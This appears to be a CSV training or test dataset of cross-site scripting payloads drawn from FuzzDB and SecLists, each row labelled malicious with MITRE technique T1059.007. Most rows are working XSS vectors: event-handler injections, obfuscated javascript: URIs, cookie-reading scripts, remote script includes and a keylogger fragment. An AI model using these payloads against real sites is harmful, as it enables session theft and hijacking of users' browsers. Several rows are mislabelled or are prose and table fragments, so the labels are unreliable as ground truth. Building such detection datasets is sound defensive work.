Payload,Signature,AttackType,Severity,MITRE,Label,Description
<script>alert('svg title')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
a{b:`function(){alert(1)}()`;},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Basic single quoted attribute breaker,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<sCriPt/src=//14.rs?,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This aim-uri executes the calc.exe on vulnerable systems,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
</div>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This vector utilizes an urlencoded JS image source to create an alert.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>window['alert'](document['domain'])</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<svg onload=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<textarea onfocus=alert('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.,SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert('sub-svg 1'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<img/**/src=x/**/onerror=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector utilizes whitespace to obfuscate and contains a JS link.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert('/'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Obfuscated JS image source,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<!-- IE 5-9 standards mode -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
OBJECT,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>,SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ondrop,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&#x003c;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ondeactivate,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
(/* */oNcliCk=alert() ),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Self-contained XSS variant 8,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert('=='),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ondevicelight,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Evade Regex Filter 4,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<iframe src=javascript:prompt('XSS')></iframe>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Remote Stylesheet 4,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>alert(1)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""133""><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onclick,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmediaerror,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script>{onerror=alert}throw 1337</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<input onfocus=prompt('XSS') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg onload=confirm('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Advanced XSS Locator,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<video><source onerror=javascript:alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
XML data island w/CDATA,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x oncut=alert(1)>copy this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. All important characters are obfuscated by unclosed entities.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onmsgesturerestart,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
SCRIPT w/Alert(),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Author Name: ha.ckers.org,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
javascript:alert('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
chrome&jsonp=alert(1);,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script type=""text/javascript"">alert(document.cookie)</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script>alert(1)//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Malformed IMG Tags,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onstorage,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This markup breaking vector utilizes specially crafted quotes to break the existing markup.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
eval(URL.slice(-8))>#alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<img src=1 onerror=alert('XSS') style=display:none>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Advanced Cross-Site Scripting variant
</html:html>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
javascript:alert('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
JavaScript Includes,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
$eval('x=alert(1)//');,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<style type=""text/css"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onpointerout=""alert(45)"">MOVE HERE</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<a class=bar href=""http://www.example.org"">www.example.org</a>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<script type=""text/javascript"">confirm('XSS')</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<math>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ondrag,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
IMG w/JavaScript Directive,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
top[8680439..toString(30)](1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
JavaScript concatenation vector variant 6,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onplaying,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ʺ＞＜svg onload=alert(/XSS/)＞/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"    <script>onerror=alert;throw 1337</script>""",SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script>confirm('1')</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<body onload=alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""javascript:alert(87)""><rect width=""1000"" height=""1000"" fill=""white""/></a>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Exploit Description: Concatenates obfuscated eval() and substr() to be called on location.hash,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<body onload=alert(/XSS/.source)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert('svg desc'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onwebkitanimationend,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svg onload=alert(1)//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<foreignObject xlink:href=""javascript:alert(88)""/>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<IMG SRC=javascript:alert('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""43""><?xml version=""1.0"" standalone=""no""?>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onmouseout=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<iframe/onreadystatechange=alert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Basic back ticked attribute breaker,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
</script> %>/,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<input onfocus=alert(""XSS"") autofocus>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"msgbox(""XSS"")",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
JavaScript concatenation vector variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
setTimeout(location.search.slice(1));,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
ondeviceorientation,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
</script><script>alert(1)</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<img src='1' onerror\x0d=alert(0) />,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<math><brute xlink:href=javascript:alert(1)>click,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<input onfocus=alert('1') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onkeypress,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<!-- IE 6-9 -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onsynchrestored,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Obfuscated DOM element creation,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
alert('svg animatetransform onbegin'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert('svg script'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert&lpar;1&rpar;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<handler id=""y"">alert(127)</handler>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onblur=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""120""><script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script>document.cookie='sessionid=hacked'</script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Hackazon session hijacking
Exploit Description: Firefox uses Google's ”feeling lucky” function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's ”keyword:” protocol. You can concatenate several keywords by using something like the following ”keyword:XSS+RSnake”,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
&lt;SCRIPT SRC=//xss.rocks/.j>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
script-src 'self' data:,SSRF,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector breaks JS integer assignments in arrays.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=d><x xmlns='""><iframe onload=alert(2)//'></div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"</style>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"echo -n ""alert(document.cookie)"" | base64",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
XSS Quick Test,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
INPUT Image,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT a="">"" '' SRC=""http://xss.rocks/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
javascript:confirm('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<span onkeydown=prompt(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Obfuscated XML predicate vector variation 1,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"@font-face {font-family: y; src: url(""font.svg#x"") format(""svg"");} body {font: 100px ""y"";}",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<input type=""hidden"" accesskey=""X"" onclick=""alert(1)"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<object/data=""jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;"">",SQLi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""83""><x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)""><x:timer value=""1""/></x:template>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Self-contained XSS variant 5,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
URL-breaking vector,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT SRC=""http:&#47;&#47;xss.rocks/xss.jpg""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"""><script type=""text/javascript"">alert(""XSS"")</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
.source a[a] (name),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div/onmouseover='alert(1)'> style=""x:"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<LAYER SRC=""http://xss.rocks/scriptlet.html""></LAYER>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
navigator.vibrate(500),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<!-- FF 14+ -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<STYLE>BODY{-moz-binding:url(""http://xss.rocks/xssmoz.xml#xss"")}</STYLE>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: Image XSS using the JavaScript directive.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
IE expression injection,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Name contained XSS variant 3,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onresume,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: This vector utilizes backslashes to exploit a parsing error in gecko based browsers and injects a remote XBL. As we can see gecko based browsers accept various characters as valid tags.,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
</body>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""alert(126)"" style=""behavior:url(#x);""><param name=postdomevents /></object>//[""'`-->]]>]</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
</html:script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Markup breaker with special quotes,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onrowdelete,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onbounce,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<script>prompt(""XSS"")</script>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<object onafterscriptexecute=confirm(0)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<input autofocus onfocus=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
window.location,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
| `\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE     |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
content: “\61\6c\65\72\74\28\31\29″,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<video src=_ onloadstart=""alert(1)"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
| `K` (%E2%84) | `toLowerCase()` | k |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ondragend,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"location=""http://html5sec.org"";",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<input onfocus=alert('document.domain') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Exploit Description: This vector breaks double quoted URL input,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<embed src=javascript:alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
\u003cscript\u003ealert('XSS')\u003c/script\u003e,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
<script x>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
__parent__ stored JS alert,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<script src=//brutelogic.com.br/1.js>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"\"";alert('XSS');//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<template match=""/"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"'document.onkeypress=function(e){fetch(""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Basic title breaker,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""94""><svg xmlns=""http://www.w3.org/2000/svg"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ontouchmove,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
